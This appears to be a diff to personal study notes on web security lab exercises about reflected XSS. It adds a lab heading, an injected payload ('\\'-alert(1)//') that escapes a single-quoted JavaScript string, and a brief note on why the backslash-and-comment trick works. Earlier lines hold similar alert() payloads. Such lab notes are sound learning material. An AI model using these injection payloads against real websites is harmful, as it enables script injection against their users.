@@ -793,7 +793,21 @@ final payload --> test'; alert(2); let myvar='hi
 
 var searchTerms = '' + alert(1) + '';
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-___________________________________________________________________________________________________________________________________________________________________
+__________________________________________________________________________________________________________________________________________________________________
+Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+--------------------------------------------------------------------------------------------------------------------
 
-                 
+var searchTerms = '\\'-alert(1)//';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+
+Whatever you write behind the alert(), it blocks with /' all the time,
+so that comment with //                    
+
+
+
+
+
+
+
  
